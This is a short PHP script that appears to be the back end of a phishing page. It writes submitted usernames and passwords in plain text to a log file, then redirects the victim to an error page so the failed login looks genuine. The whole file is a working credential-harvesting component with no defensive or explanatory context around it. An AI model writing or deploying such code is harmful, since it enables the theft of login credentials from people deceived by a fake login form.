
<?php
$log = fopen("log.txt", "a");
fwrite($log, "Username: " . $_POST['username'] . " | Password: " . $_POST['password'] . " | Time: " . date("Y-m-d H:i:s") . "\n");
fclose($log);
header("Location: error.html");
exit();
?>
